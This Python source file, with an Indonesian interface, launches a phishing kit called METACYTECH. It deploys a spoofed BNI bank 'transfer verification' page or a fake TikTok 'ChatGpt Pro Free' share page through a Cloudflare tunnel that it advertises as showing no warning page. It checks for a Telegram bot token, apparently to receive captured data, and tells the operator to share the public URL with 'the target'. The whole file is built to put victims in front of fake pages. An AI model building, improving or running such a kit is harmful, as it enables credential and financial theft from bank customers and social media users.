#!/usr/bin/env python3
"""
METACYTECH - Interactive Launcher v3.0
Dual Template System: BNI (Bank Transfer) + TikTok (Video Share Link)
Cloudflare Tunnel (no warning page) + Next.js + Telegram
"""

import os
import sys
import time
import json
import re
import shutil
import subprocess
import threading
import urllib.request

IS_WIN = sys.platform == "win32"
IS_ANDROID = "ANDROID_ROOT" in os.environ or "TERMUX_VERSION" in os.environ

if IS_WIN:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        os.system("")

def _find_pid_on_port(port):
    """Find PID listening on a given port. Cross-platform."""
    try:
        if IS_WIN:
            r = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=5, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
            for line in r.stdout.split("\n"):
                if f":{port}" in line and "LISTENING" in line:
                    return line.split()[-1]
        else:
            r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.split("\n"):
                if f":{port}" in line:
                    m = re.search(r'pid=(\d+)', line)
                    if m:
                        return m.group(1)
            r = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True, timeout=5)
            pids = r.stdout.strip().split("\n")
            if pids and pids[0]:
                return pids[0]
    except Exception:
        pass
    return None

def check_port(port):
    pid = _find_pid_on_port(port)
    return pid is not None

def kill_port(port):
    try:
        pid = _find_pid_on_port(port)
        if pid:
            if IS_WIN:
                subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True, timeout=5, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
            else:
                subprocess.run(["kill", "-9", pid], capture_output=True, timeout=5)
    except Exception:
        pass

def kill_all():
    procs = ["node", "cloudflared", "ngrok"]
    if IS_WIN:
        for exe in ["node.exe", "cloudflared.exe", "ngrok.exe"]:
            subprocess.run(["taskkill", "/F", "/IM", exe], capture_output=True, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
    else:
        for name in procs:
            subprocess.run(["pkill", "-9", "-f", name], capture_output=True)

def _find_cloudflared_path():
    p = shutil.which("cloudflared")
    if p:
        return p
    if IS_WIN:
        for path in [r"C:\Program Files (x86)\cloudflared\cloudflared.exe", r"C:\Program Files\cloudflared\cloudflared.exe"]:
            if os.path.exists(path):
                return path
    else:
        termux_path = "/data/data/com.termux/files/usr/bin/cloudflared"
        if os.path.exists(termux_path):
            return termux_path
        for path in ["/usr/bin/cloudflared", "/usr/local/bin/cloudflared"]:
            if os.path.exists(path):
                return path
    return None

APP_DIR = os.path.dirname(os.path.abspath(__file__))
SRC_PAGE = os.path.join(APP_DIR, "src", "app", "page.tsx")
SRC_LAYOUT = os.path.join(APP_DIR, "src", "app", "layout.tsx")
TEMPLATES_DIR = os.path.join(APP_DIR, "templates")

TEMPLATES = {
    "bni": {
        "name": "BNI - Bank Transfer",
        "icon": "[1]",
        "label": "Bank Transfer Verification",
        "title": "BNI - Hasil Transaksi",
        "description": "Konfirmasi transfer bank aman",
        "favicon": "favicon.svg",
        "og_image": "/bni-logo.svg",
        "dir": os.path.join(TEMPLATES_DIR, "bni"),
        "public_dir": os.path.join(TEMPLATES_DIR, "bni", "public"),
    },
    "tiktok": {
        "name": "TikTok - Video Share Link",
        "icon": "[2]",
        "label": "TikTok Video Verification",
        "title": "TikTok - ChatGpt Pro Free",
        "description": "vt.tiktok.com",
        "favicon": "favicon.svg",
        "og_image": "/LOGO-TIKTOK.png",
        "dir": os.path.join(TEMPLATES_DIR, "tiktok"),
        "public_dir": os.path.join(TEMPLATES_DIR, "tiktok", "public"),
    },
}


class C:
    RST = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    BG_B = "\033[44m"
    MAG = "\033[35m"
    BG_R = "\033[41m"


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    cls()
    hacker_art = [
        r"",
        r"                                  .:=+*##%%%@@@@@@%%%##*+=:.                                          ",
        r"                              :=*%@@@@@@@@@@@@@@@@@@@@@@@@@%*=:                                       ",
        r"                           .+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.                                     ",
        r"                         -*@@@@@@@@@@@@################@@@@@@@@@@*-                                   ",
        r"                       =%@@@@@@@@%*=-:::::::::::::::::::-=*%@@@@@@%=                                  ",
        r"                     :%@@@@@@%+:..   .-==++******++==-.   ..:+%@@@@@@%:                               ",
        r"                    =@@@@@@#:    :+#%@@@@@@@@@@@@@@@@@%#+:    :#@@@@@@=                               ",
        r"                   +@@@@@@=   .=%@@@@@@@@@@@@@@@@@@@@@@@@@%=.   =@@@@@@+                              ",
        r"                  =@@@@@@=   =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=   =@@@@@@=                              ",
        r"                 .@@@@@@*   +@@@@@@%#*+=--:::::--=+*#%@@@@@@#+   *@@@@@@.                             ",
        r"                 #@@@@@@.  =@@@@@*:.   .:------:.   .:*@@@@@=  .@@@@@@#                              ",
        r"                :@@@@@@%  .@@@@@=    -*@@@@@@@@@@*-    =@@@@@.  %@@@@@@:                              ",
        r"                =@@@@@@#  :@@@@+   .#@@@@@@@@@@@@@@#.   +@@@@:  #@@@@@@=                              ",
        r"                *@@@@@@*  :@@@#   .%@@@#**@@@@**#@@@%.   #@@@:  *@@@@@@*                              ",
        r"                %@@@@@@=  :@@@-   +@@@*  *@@@@*  *@@@+   -@@@:  =@@@@@@%                              ",
        r"                %@@@@@@-  .@@@.   #@@@:  -@@@@-  :@@@#   .@@@.  -@@@@@@%                              ",
        r"                #@@@@@@+   @@@:   *@@@+   +@@+   +@@@*   :@@@   +@@@@@@#                              ",
        r"                =@@@@@@%   =@@@.   #@@@*-:....:-*@@@#   .@@@=   %@@@@@@=                              ",
        r"                :@@@@@@@-   *@@@=   -#@@@@@@@@@@@@#-   =@@@*   -@@@@@@@:                              ",
        r"                 #@@@@@@#   .#@@@*:   :=*####*=:   :*@@@#.   #@@@@@@#                               ",
        r"                 .@@@@@@@+    =%@@@@#+=:......:=+#@@@@%=    +@@@@@@@.                                ",
        r"                  =@@@@@@@@-    :+#%@@@@@@@@@@@@@@%#+:    -@@@@@@@@=                                 ",
        r"                   +@@@@@@@@#:      .:-==++++==-:.      :#@@@@@@@@+                                  ",
        r"            :+#%%#*=:=@@@@@@@@@@*-.                  .-*@@@@@@@@@@:=*#%%#+:                          ",
        r"          =%@@@@@@@@@@@@@@@@@@@@@@@@%#*+========+*#%@@@@@@@@@@@@@@@@@@@@@@@@%=                       ",
        r"        .#@@@@@%#*+=-:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@::-=+*#%@@@@@#.                     ",
        r"       .%@@@@*:       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       :*@@@@%.                     ",
        r"       +@@@@=    .:-=#@@@@@@@@@%######################%@@@@@@@@@@@#=-:.    =@@@@+                     ",
        r"       *@@@%    +@@@@@@@@@@@@#-                        -#@@@@@@@@@@@@@@+    %@@@*                     ",
        r"       *@@@%    %@@@@@@@@@@@+      .::--------::.        +@@@@@@@@@@@%    %@@@*                     ",
        r"       =@@@@-   :@@@@@@@@@@@-    -*@@@@@@@@@@@@@@*-      -@@@@@@@@@@@:   -@@@@=                     ",
        r"        %@@@@+   .%@@@@@@@@@=   =@@@@@@@@@@@@@@@@@@@=     =@@@@@@@@@%.   +@@@@%                      ",
        r"        .*@@@@#:  .*@@@@@@@@@:  *@@@@@@@@@@@@@@@@@@@@@*   :@@@@@@@@@*.  :#@@@@*.                     ",
        r"          =%@@@@%*++#@@@@@@@@%::#@@@@@@@@@@@@@@@@@@@@@@@:.%@@@@@@@@#++*%@@@@%=                       ",
        r"            -*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*-                        ",
        r"               .:=+*##%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%##*+=:.                             ",
        r"",
    ]
    title = [
        r"   ███╗   ███╗███████╗████████╗ █████╗  ██████╗██████╗ ██╗   ██╗████████╗███████╗ ██████╗██╗  ██╗",
        r"   ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║",
        r"   ██╔████╔██║█████╗     ██║   ███████║██║     ██████╔╝ ╚████╔╝    ██║   █████╗  ██║     ███████║",
        r"   ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║     ██╔══██╗  ╚██╔╝     ██║   ██╔══╝  ██║     ██╔══██║",
        r"   ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║╚██████╗██║  ██║   ██║      ██║   ███████╗╚██████╗██║  ██║",
        r"   ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝",
    ]
    print()
    art_colors = [C.CYN, C.BLU, C.MAG, C.CYN, C.BLU, C.MAG]
    idx = 0
    for line in hacker_art:
        col = art_colors[idx % len(art_colors)]
        sys.stdout.write(f"{col}{C.B}{line}{C.RST}\n")
        time.sleep(0.02)
        idx += 1
    print()
    cols = [C.CYN, C.WHT, C.CYN, C.CYN, C.WHT, C.CYN]
    for line in title:
        for i, ch in enumerate(line):
            sys.stdout.write(f"{cols[i % 3]}{ch}")
        sys.stdout.write(C.RST + "\n")
        time.sleep(0.03)
    print()
    print(f"{C.CYN}  {'=' * 64}{C.RST}")
    print(f"{C.B}{C.WHT}  METACYTECH  *  Cloudflare Tunnel  *  Telegram{C.RST}")
    print(f"{C.CYN}  {'=' * 64}{C.RST}")
    print()


def template_menu(current_template):
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print(f"{C.B}{C.WHT}  |            PILIH TEMPLATE                       |{C.RST}")
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    for key, t in TEMPLATES.items():
        marker = f" {C.GRN}< active{C.RST}" if key == current_template else ""
        print(f"{C.B}{C.WHT}  |  {t['icon']} {t['name']:<42} |{C.RST}")
        print(f"{C.DIM}  |       {t['label']:<30}{marker:<12}{C.RST} |{C.RST}")
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print()


def menu(current_template):
    tmpl = TEMPLATES[current_template]
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print(f"{C.B}{C.WHT}  |              MAIN MENU                          |{C.RST}")
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print(f"{C.B}{C.WHT}  |  [1] Start Everything                          |{C.RST}")
    print(f"{C.DIM}  |       Build + Server + Cloudflare Tunnel       |{C.RST}")
    print(f"{C.B}{C.WHT}  |  [2] Stop Everything                           |{C.RST}")
    print(f"{C.DIM}  |       Kill all services                        |{C.RST}")
    print(f"{C.B}{C.WHT}  |  [3] Show Status                               |{C.RST}")
    print(f"{C.DIM}  |       Check running services & URL             |{C.RST}")
    print(f"{C.B}{C.WHT}  |  [4] Copy URL                                  |{C.RST}")
    print(f"{C.DIM}  |       Copy tunnel URL to clipboard             |{C.RST}")
    print(f"{C.B}{C.WHT}  |  [5] Ganti Template                            |{C.RST}")
    print(f"{C.DIM}  |       Current: {tmpl['name']:<29}{C.RST}|{C.RST}")
    print(f"{C.B}{C.WHT}  |  [6] Exit                                      |{C.RST}")
    print(f"{C.DIM}  |       Stop all and quit                        |{C.RST}")
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print()


class Engine:
    def __init__(self):
        self.app_dir = APP_DIR
        self.app_port = 3000
        self.nextjs_proc = None
        self.tunnel_proc = None
        self.url = None
        self.building = False
        self.current_template = "bni"

    def _nw(self):
        flags = {}
        if hasattr(subprocess, "CREATE_NO_WINDOW"):
            flags["creationflags"] = subprocess.CREATE_NO_WINDOW
        return flags

    def apply_template(self, template_key):
        tmpl = TEMPLATES.get(template_key)
        if not tmpl:
            print(f"{C.RED}  Template '{template_key}' not found!{C.RST}")
            return False
        tmpl_dir = tmpl["dir"]
        tmpl_page = os.path.join(tmpl_dir, "page.tsx")
        if not os.path.exists(tmpl_page):
            print(f"{C.RED}  Template file not found: {tmpl_page}{C.RST}")
            return False
        SRC_PUBLIC = os.path.join(self.app_dir, "public")
        tmpl_pub = tmpl.get("public_dir")
        print(f"{C.CYN}  Applying template: {tmpl['name']}...{C.RST}")
        shutil.copy2(tmpl_page, SRC_PAGE)
        tmpl_layout = os.path.join(tmpl_dir, "layout.tsx")
        if os.path.exists(tmpl_layout):
            shutil.copy2(tmpl_layout, SRC_LAYOUT)
            print(f"{C.DIM}  Copied: layout.tsx{C.RST}")
        if tmpl_pub and os.path.isdir(tmpl_pub):
            for fname in os.listdir(tmpl_pub):
                src_f = os.path.join(tmpl_pub, fname)
                dst_f = os.path.join(SRC_PUBLIC, fname)
                if os.path.isfile(src_f):
                    shutil.copy2(src_f, dst_f)
                    print(f"{C.DIM}  Copied: {fname}{C.RST}")
        print(f"{C.GRN}  Template '{tmpl['name']}' applied!{C.RST}")
        self.current_template = template_key
        return True

    def check_port(self, port):
        return check_port(port)

    def kill_port(self, port):
        kill_port(port)

    def kill_all(self):
        kill_all()
        self.nextjs_proc = None
        self.tunnel_proc = None

    def build(self):
        print(f"\n{C.CYN}  Building Next.js app...{C.RST}")
        nm = os.path.join(self.app_dir, "node_modules")
        if not os.path.exists(nm):
            print(f"{C.YLW}  Installing dependencies...{C.RST}")
            subprocess.run(["npm", "install"], cwd=self.app_dir, shell=IS_WIN, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        env["NODE_OPTIONS"] = "--max-old-space-size=4096"
        # On Android, Turbopack (default in Next.js 16 build) is NOT supported on ARM
        # Downgrade to Next.js 15 which uses Webpack for build (Turbopack only for dev)
        # Next.js 15 also supports React 19 and Tailwind v4, so minimal changes needed
        did_downgrade = False
        pkg_json = os.path.join(self.app_dir, "package.json")
        pkg_bak = pkg_json + ".bak"
        try:
            if IS_ANDROID:
                with open(pkg_json, "r") as f:
                    pkg_data = json.load(f)
                next_ver = pkg_data.get("dependencies", {}).get("next", "")
                if next_ver and not next_ver.startswith("15"):
                    print(f"{C.YLW}  Android: downgrading Next.js to v15 (Turbopack v16 not supported on ARM)...{C.RST}")
                    shutil.copy2(pkg_json, pkg_bak)
                    pkg_data["dependencies"]["next"] = "15.3.3"
                    dev_deps = pkg_data.get("devDependencies", {})
                    if "eslint-config-next" in dev_deps:
                        dev_deps["eslint-config-next"] = "15.3.3"
                    with open(pkg_json, "w") as f:
                        json.dump(pkg_data, f, indent=2)
                    # Must delete node_modules and package-lock.json for clean reinstall
                    print(f"{C.DIM}  Cleaning node_modules for fresh install...{C.RST}")
                    nm_dir = os.path.join(self.app_dir, "node_modules")
                    lock_file = os.path.join(self.app_dir, "package-lock.json")
                    if os.path.exists(nm_dir):
                        shutil.rmtree(nm_dir, ignore_errors=True)
                    if os.path.exists(lock_file):
                        os.remove(lock_file)
                    subprocess.run(["npm", "install"], cwd=self.app_dir, shell=IS_WIN, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    did_downgrade = True
                    print(f"{C.GRN}  Next.js v15.3.3 ready for Android build (uses Webpack){C.RST}")
        except Exception as e:
            print(f"{C.RED}  Failed to downgrade Next.js: {e}{C.RST}")
        self.building = True
        frames = ["|", "/", "-", "\\"]
        def spin():
            i = 0
            while self.building:
                sys.stdout.write(f"\r{C.CYN}  {frames[i % 4]} Building...{C.RST}  ")
                sys.stdout.flush()
                time.sleep(0.1)
                i += 1
        t = threading.Thread(target=spin, daemon=True)
        t.start()
        build_timeout = 600 if IS_ANDROID else 120
        r = subprocess.run(["npx", "next", "build"], cwd=self.app_dir, env=env, shell=IS_WIN, capture_output=True, text=True, timeout=build_timeout)
        self.building = False
        time.sleep(0.2)
        sys.stdout.write("\r" + " " * 40 + "\r")
        sys.stdout.flush()
        # Restore package.json after build (whether success or failure)
        if did_downgrade and os.path.exists(pkg_bak):
            try:
                shutil.copy2(pkg_bak, pkg_json)
                os.remove(pkg_bak)
                print(f"{C.DIM}  package.json restored to original version{C.RST}")
            except Exception:
                pass
        if r.returncode == 0:
            print(f"{C.GRN}  Build successful!{C.RST}")
            return True
        print(f"{C.RED}  Build failed!{C.RST}")
        if r.stderr:
            for e in r.stderr.strip().split("\n")[-3:]:
                print(f"{C.RED}     {e}{C.RST}")
        return False

    def start_server(self):
        if self.check_port(self.app_port):
            print(f"{C.YLW}  Port {self.app_port} in use, clearing...{C.RST}")
            self.kill_port(self.app_port)
            time.sleep(2)
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        self.nextjs_proc = subprocess.Popen(["npx", "next", "start", "-p", str(self.app_port)], cwd=self.app_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        print(f"{C.CYN}  Starting server on port {self.app_port}...{C.RST}")
        for i in range(15):
            time.sleep(1)
            if self.check_port(self.app_port):
                print(f"{C.GRN}  Server running at http://localhost:{self.app_port}{C.RST}")
                return True
            sys.stdout.write(f"\r{C.CYN}  Waiting... ({i+1}s){C.RST}  ")
            sys.stdout.flush()
        sys.stdout.write("\r" + " " * 40 + "\r")
        sys.stdout.flush()
        print(f"{C.GRN}  Server starting...{C.RST}")
        return True

    def _find_cloudflared(self):
        return _find_cloudflared_path()

    def start_tunnel(self):
        cf = self._find_cloudflared()
        if not cf:
            print(f"{C.RED}  cloudflared not found!{C.RST}")
            print(f"{C.DIM}     Install: pkg install cloudflared{C.RST}")
            return self._start_ngrok_fallback()
        self.kill_tunnel()
        time.sleep(1)
        print(f"{C.CYN}  Starting Cloudflare Tunnel...{C.RST}")
        log = os.path.join(self.app_dir, "tunnel.log")
        self.tunnel_proc = subprocess.Popen([cf, "tunnel", "--url", f"http://localhost:{self.app_port}"], stdout=open(log, "w"), stderr=subprocess.STDOUT, **self._nw())
        ssl_error_detected = False
        for i in range(30):
            time.sleep(2)
            try:
                with open(log) as f:
                    content = f.read()
                    # Check for SSL certificate errors (common in Termux/Android)
                    if "x509" in content or "certificate" in content.lower() and "unknown authority" in content:
                        ssl_error_detected = True
                        print(f"{C.YLW}  Cloudflared SSL error detected (Termux/Android issue){C.RST}")
                        self.kill_tunnel()
                        return self._start_ngrok_fallback()
                    all_urls = re.findall(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
                    # Get unique URLs, filter api.trycloudflare.com, prefer longer subdomains
                    unique_urls = list(set(all_urls))
                    tunnel_urls = [u for u in unique_urls if "api" not in u.lower()]
                    if tunnel_urls:
                        # Prefer URL with longer subdomain (more likely to be actual tunnel)
                        self.url = max(tunnel_urls, key=lambda u: len(u.split(".")[0]))
                        print(f"{C.GRN}  Cloudflare Tunnel ready! (No warning page!){C.RST}")
                        return self.url
            except Exception:
                pass
        if not ssl_error_detected:
            print(f"{C.YLW}  Could not get tunnel URL{C.RST}")
        return None

    def _start_ngrok_fallback(self):
        try:
            subprocess.run(["ngrok", "--version"], capture_output=True, shell=True, check=True, **self._nw())
        except Exception:
            print(f"{C.RED}  Neither cloudflared nor ngrok found!{C.RST}")
            return None
        self.kill_tunnel()
        time.sleep(1)
        print(f"{C.CYN}  Starting ngrok (has warning page)...{C.RST}")
        self.tunnel_proc = subprocess.Popen(f"ngrok http {self.app_port}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, **self._nw())
        for _ in range(10):
            time.sleep(2)
            try:
                with urllib.request.urlopen("http://localhost:4040/api/tunnels", timeout=3) as r:
                    for t in json.loads(r.read()).get("tunnels", []):
                        if t.get("proto") == "https":
                            self.url = t["public_url"]
                            print(f"{C.GRN}  Ngrok tunnel ready!{C.RST}")
                            return self.url
            except Exception:
                pass
        return None

    def kill_tunnel(self):
        if IS_WIN:
            for exe in ["cloudflared.exe", "ngrok.exe"]:
                subprocess.run(["taskkill", "/F", "/IM", exe], capture_output=True, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
        else:
            for name in ["cloudflared", "ngrok"]:
                subprocess.run(["pkill", "-9", "-f", name], capture_output=True)
        log = os.path.join(self.app_dir, "tunnel.log")
        if os.path.exists(log):
            try: os.remove(log)
            except: pass
        self.tunnel_proc = None

    def has_telegram(self):
        env = os.path.join(self.app_dir, ".env.local")
        if os.path.exists(env):
            with open(env) as f:
                c = f.read()
                return "TELEGRAM_BOT_TOKEN" in c and "TELEGRAM_CHAT_ID" in c
        return False

    def start_all(self):
        tmpl = TEMPLATES[self.current_template]
        print(f"\n{C.B}{C.WHT}  {'=' * 50}{C.RST}")
        print(f"{C.B}{C.WHT}  MEMULAI LAYANAN{C.RST}")
        print(f"{C.B}{C.WHT}  Template: {tmpl['name']}{C.RST}")
        print(f"{C.B}{C.WHT}  {'=' * 50}{C.RST}\n")
        if self.has_telegram():
            print(f"{C.GRN}  Telegram bot sudah dikonfigurasi{C.RST}")
        else:
            print(f"{C.YLW}  Telegram bot BELUM dikonfigurasi{C.RST}")
        print()
        if not self.apply_template(self.current_template):
            return False
        print()
        if not self.build(): return False
        print()
        if not self.start_server(): return False
        print()
        url = self.start_tunnel()
        if url:
            self._update_metadata_base(url)
            print(f"\n{C.CYN}  Rebuilding with correct metadataBase...{C.RST}")
            if self.build():
                self._restart_server()
        print()
        self.show_ready(url)
        return True

    def _update_metadata_base(self, url):
        if not os.path.exists(SRC_LAYOUT):
            return
        with open(SRC_LAYOUT, "r", encoding="utf-8") as f:
            content = f.read()
        if "metadataBase" in content:
            content = re.sub(
                r'metadataBase:\s*new URL\("[^"]*"\)',
                'metadataBase: new URL("' + url + '")',
                content
            )
        else:
            content = content.replace(
                "};\n\nexport default",
                '  metadataBase: new URL("' + url + '"),\n};\n\nexport default'
            )
        with open(SRC_LAYOUT, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"{C.GRN}  metadataBase updated: {url}{C.RST}")

    def _restart_server(self):
        print(f"{C.CYN}  Restarting server after rebuild...{C.RST}")
        self.kill_port(self.app_port)
        time.sleep(2)
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        self.nextjs_proc = subprocess.Popen(["npx", "next", "start", "-p", str(self.app_port)], cwd=self.app_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        for i in range(10):
            time.sleep(1)
            if self.check_port(self.app_port):
                print(f"{C.GRN}  Server restarted!{C.RST}")
                return True
        return True

    def stop_all(self):
        print(f"\n{C.YLW}  Stopping all services...{C.RST}")
        if self.nextjs_proc:
            try:
                self.nextjs_proc.terminate()
                self.nextjs_proc.wait(timeout=5)
            except: pass
        self.kill_port(self.app_port)
        print(f"{C.DIM}  Server stopped{C.RST}")
        self.kill_tunnel()
        print(f"{C.DIM}  Tunnel stopped{C.RST}")
        self.url = None
        print(f"{C.GRN}  All services stopped!{C.RST}\n")

    def show_status(self):
        tmpl = TEMPLATES[self.current_template]
        print(f"\n{C.B}{C.WHT}  {'=' * 50}{C.RST}")
        print(f"{C.B}{C.WHT}  STATUS LAYANAN{C.RST}")
        print(f"{C.B}{C.WHT}  {'=' * 50}{C.RST}\n")
        srv = self.check_port(self.app_port)
        print(f"  {'OK' if srv else 'XX'} Next.js Server : {'BERJALAN' if srv else 'BERHENTI'} (port {self.app_port})")
        print(f"  Template     : {tmpl['name']}")
        url = None
        log = os.path.join(self.app_dir, "tunnel.log")
        if os.path.exists(log):
            try:
                with open(log) as f:
                    content = f.read()
                    all_urls = re.findall(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
                    # Get unique URLs, filter api.trycloudflare.com, prefer longer subdomains
                    unique_urls = list(set(all_urls))
                    tunnel_urls = [u for u in unique_urls if "api" not in u.lower()]
                    if tunnel_urls:
                        # Prefer URL with longer subdomain (more likely to be actual tunnel)
                        url = max(tunnel_urls, key=lambda u: len(u.split(".")[0]))
                        self.url = url
            except: pass
        if url:
            print(f"  Tunnel       : BERJALAN (Cloudflare - Tanpa warning page)")
            print(f"  Public URL   : {url}")
        else:
            print(f"  Tunnel       : BERHENTI")
        print(f"  Telegram Bot : {'TERKONFIGURASI' if self.has_telegram() else 'BELUM DIKONFIGURASI'}")
        print(f"\n{C.DIM}  Local: http://localhost:{self.app_port}{C.RST}\n")

    def show_ready(self, url=None):
        tmpl = TEMPLATES[self.current_template]
        print(f"{C.B}{C.GRN}  ==================================================={C.RST}")
        print(f"{C.B}{C.GRN}              SISTEM SIAP!{C.RST}")
        print(f"{C.B}{C.GRN}  ==================================================={C.RST}\n")
        print(f"  Template: {C.B}{tmpl['name']}{C.RST}")
        if url:
            print(f"\n{C.B}{C.CYN}  PUBLIC URL (Bagikan ini!):{C.RST}\n")
            print(f"  {C.B}{C.BG_B}{C.WHT}  {url}  {C.RST}\n")
        else:
            print(f"  {C.YLW}URL tunnel tidak tersedia{C.RST}")
        print(f"{C.DIM}  Local: http://localhost:{self.app_port}{C.RST}")
        print(f"\n{C.B}  Bagikan URL di atas ke target!{C.RST}")
        print(f"{C.DIM}  Tekan [2] untuk berhenti, [3] untuk status, [6] untuk keluar{C.RST}\n")


def choose_template(eng):
    banner()
    template_menu(eng.current_template)
    tmpl_keys = list(TEMPLATES.keys())
    print(f"{C.CYN}  Pilih template (1-{len(tmpl_keys)}): {C.RST}", end="")
    choice = input().strip()
    if choice in ["1", "2"]:
        idx = int(choice) - 1
        if idx < len(tmpl_keys):
            key = tmpl_keys[idx]
            if key != eng.current_template:
                eng.stop_all()
                eng.current_template = key
                print(f"\n{C.GRN}  Template diubah ke: {TEMPLATES[key]['name']}{C.RST}")
                time.sleep(1)
                eng.start_all()
            else:
                print(f"{C.YLW}  Template sudah aktif!{C.RST}")
        else:
            print(f"{C.YLW}  Pilihan tidak valid!{C.RST}")
    else:
        print(f"{C.YLW}  Pilihan tidak valid!{C.RST}")


def main():
    if os.name == "nt": os.system("")
    eng = Engine()
    banner()

    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print(f"{C.B}{C.WHT}  |         PILIH TEMPLATE TERLEBIH DAHULU          |{C.RST}")
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print(f"{C.B}{C.WHT}  |  [1] BNI - Bank Transfer Verification           |{C.RST}")
    print(f"{C.DIM}  |       Template transfer bank BNI               |{C.RST}")
    print(f"{C.B}{C.WHT}  |  [2] TikTok - Video Share Link                  |{C.RST}")
    print(f"{C.DIM}  |       Template verifikasi video TikTok         |{C.RST}")
    print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
    print()

    while True:
        try:
            print(f"{C.CYN}  Pilih template (1-2): {C.RST}", end="")
            ch = input().strip()
            if ch in ["1", "2"]:
                idx = int(ch) - 1
                tmpl_keys = list(TEMPLATES.keys())
                eng.current_template = tmpl_keys[idx]
                print(f"\n{C.GRN}  Template dipilih: {TEMPLATES[eng.current_template]['name']}{C.RST}")
                time.sleep(0.5)
                break
            else:
                print(f"{C.YLW}  Masukkan 1 atau 2!{C.RST}")
        except (KeyboardInterrupt, EOFError):
            print(f"\n{C.CYN}Sampai jumpa!{C.RST}")
            sys.exit(0)

    eng.start_all()

    while True:
        try:
            print(f"{C.B}{C.WHT}  {'=' * 50}{C.RST}\n")
            menu(eng.current_template)
            print(f"{C.CYN}  Pilih menu (1-6): {C.RST}", end="")
            ch = input().strip()
            if ch == "1": eng.start_all()
            elif ch == "2": eng.stop_all()
            elif ch == "3": eng.show_status()
            elif ch == "4":
                url = eng.url
                if not url:
                    eng.show_status()
                    url = eng.url
                if url:
                    print(f"\n  {C.B}{C.CYN}URL:{C.RST}")
                    print(f"  {C.BG_B}{C.WHT}  {url}  {C.RST}\n")
                    try:
                        subprocess.run("clip", input=url.encode("utf-8"), check=True)
                        print(f"  {C.GRN}Disalin ke clipboard!{C.RST}\n")
                    except: print(f"  {C.DIM}(Salin manual){C.RST}\n")
                else:
                    print(f"\n  {C.YLW}Tidak ada URL. Tekan [1] untuk memulai.{C.RST}\n")
            elif ch == "5":
                choose_template(eng)
            elif ch == "6":
                eng.stop_all()
                print(f"  {C.CYN}Sampai jumpa!{C.RST}\n")
                sys.exit(0)
            else: print(f"  {C.YLW}Masukkan 1-6{C.RST}")
        except KeyboardInterrupt:
            print(); eng.stop_all()
            print(f"  {C.CYN}Sampai jumpa!{C.RST}\n"); sys.exit(0)
        except EOFError: eng.stop_all(); sys.exit(0)


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{C.CYN}Keluar...{C.RST}")
    except Exception as e:
        print(f"\n{C.RED}Error: {e}{C.RST}"); sys.exit(1)